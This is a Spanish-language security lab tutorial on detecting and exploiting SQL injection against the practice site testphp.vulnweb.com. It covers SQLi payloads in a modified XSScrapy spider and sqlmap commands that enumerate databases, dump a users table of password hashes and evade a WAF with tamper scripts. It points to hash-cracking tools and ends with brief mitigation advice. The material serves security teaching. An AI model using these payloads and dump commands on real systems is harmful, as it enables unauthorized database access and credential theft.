![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **Identificación Avanzada de SQL Injection con XSScrapy y Otras Técnicas**

 **Objetivo:** Aprender a identificar vulnerabilidades **SQL Injection (SQLi)** utilizando **XSScrapy** y otras herramientas complementarias en **Google Colab y Kali Linux**.

📌 **Técnicas abordadas:**
✅ **SQL Injection clásico**
✅ **Blind SQL Injection**
✅ **Error-Based SQL Injection**
✅ **SQL Injection con WAF bypass**
✅ **Uso de herramientas avanzadas** (XSScrapy, SQLmap, Burp Suite)

📌 **Ambiente de trabajo:**

🔹 **Google Colab (Python y XSScrapy)**

🔹 **Kali Linux (SQLmap y Burp Suite)**

------

## **🔹 Módulo 1: Instalación y Configuración del Entorno**

### **📌 1.1 Configuración en Google Colab**

Google Colab es ideal para pruebas rápidas sin necesidad de instalar software localmente.

1️⃣ **Abrir un nuevo cuaderno en** Google Colab
2️⃣ **Ejecutar los siguientes comandos para instalar XSScrapy y dependencias**:

```python
!apt-get install -y git python3-pip
!pip install scrapy
!git clone https://github.com/DanMcInerney/xsscrapy.git
!cd xsscrapy && pip install -r requirements.txt
```

Esto instalará **Scrapy** y clonará XSScrapy para su uso.

------

### **📌 1.2 Instalación en Kali Linux**

Si trabajas en **Kali Linux**, usa el siguiente comando para instalar las herramientas necesarias:

```python
sudo apt update && sudo apt install -y sqlmap burpsuite
```

✅ **SQLmap**: Herramienta automatizada para SQL Injection.

✅ **Burp Suite**: Proxy de análisis de tráfico web.

## **🔹 Módulo 2: Exploración y Análisis de SQL Injection con XSScrapy**

### **📌 2.1 Modificación de XSScrapy para detectar SQLi**

XSScrapy está diseñado para encontrar **XSS**, pero podemos modificarlo para SQL Injection.

1️⃣ Editar `xss_spider.py` con:

```python
!nano xsscrapy/xsscrapy/spiders/xss_spider.py
```

2️⃣ Agregar payloads de SQL Injection:

```python
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "' OR '1'='1' /*",
    "' UNION SELECT NULL, NULL --"
]

def parse(self, response):
    for input_tag in response.xpath('//input'):
        for payload in sql_payloads:
            test_url = response.url + "?" + input_tag.attrib.get('name', 'param') + "=" + payload
            yield scrapy.Request(test_url, callback=self.check_sql_injection)

def check_sql_injection(self, response):
    if "error" in response.text.lower() or "sql syntax" in response.text.lower():
        self.log(f"[!] SQL Injection detected: {response.url}")
```

Esto modificará XSScrapy para probar **SQLi en formularios y parámetros de URLs**.

### **📌 2.2 Escaneo con XSScrapy en un sitio vulnerable**

Ejecutamos XSScrapy en un sitio de prueba:

```python
!cd xsscrapy && scrapy crawl xss_spider -a domain="http://testphp.vulnweb.com/"
```

Si detecta vulnerabilidades, mostrará:

```python
[!] SQL Injection detected: http://testphp.vulnweb.com/listproducts.php?cat=' OR '1'='1
```

✅ **Esto confirma que el sitio es vulnerable a SQL Injection.**

## **🔹 Módulo 3: SQL Injection Avanzado con SQLmap en Kali Linux**

**SQLmap** es una herramienta potente que automatiza ataques de SQL Injection.

### **📌 3.1 Prueba de SQL Injection con SQLmap**

Ejecutamos SQLmap contra un sitio vulnerable:

```python
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```

✅ **Explicación:**

🔹 `-u` 👉 Define la URL objetivo.
🔹 `--dbs` 👉 Enumera las bases de datos.

Si el sitio es vulnerable, mostrará:

```less
available databases:
[*] acuart
[*] information_schema
```

Esto indica que la base de datos **"acuart"** está expuesta.

### **📌 3.2 Extracción de Tablas y Columnas**

Una vez identificada la base de datos, listamos las tablas:

```sql
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
```

Ejemplo de salida:

```less
available tables:
[*] users
[*] products
[*] orders
```

✅ **Podemos ver que hay una tabla `users` que podría contener credenciales.**

Listamos las columnas de la tabla `users`:

```sql
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
```

Ejemplo de salida:

```less
Database: acuart
Table: users
Columns:
[*] id
[*] username
[*] password
```

------

### **📌 3.3 Extracción de Datos Sensibles**

Ahora extraemos credenciales:

```less
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C username,password --dump
```

Ejemplo de salida:

```less
Database: acuart
Table: users
username | password
-------------------
admin    | 5f4dcc3b5aa765d61d8327deb882cf99
```

✅ **Esto indica que hemos extraído credenciales hashadas.**

Podemos usar herramientas como **hashcat** o sitios como **crackstation.net** para descifrar contraseñas.

------

## **🔹 Módulo 4: Bypassing Firewalls y Protección**

Algunos sitios usan **WAF (Web Application Firewall)** para evitar ataques. Podemos intentar evadirlos con técnicas avanzadas en SQLmap:

🔹 **Codificación de payloads**

```sql
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --tamper=space2comment --dbs
```

✅ Usa técnicas de ofuscación para evadir WAFs.

🔹 **Inyección por tiempo (Blind SQL Injection)**

```sql
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --time-sec=5 --dbs
```

✅ Útil cuando el sitio no devuelve errores visibles.

🔹 **Ataques manuales con Burp Suite**

1️⃣ Capturar la petición con **Burp Suite**.

2️⃣ Modificar parámetros en el **Repeater**.

3️⃣ Analizar respuestas del servidor.

## **🔹 Módulo 5: Mitigación de SQL Injection**

✅ **Usar consultas preparadas**

En **Python + MySQL**:

```less
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user, password))
```

✅ **Validar entrada de usuarios**

✅ **Usar Web Application Firewalls (WAF)**

✅ **Principio de mínimo privilegio en bases de datos**



![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)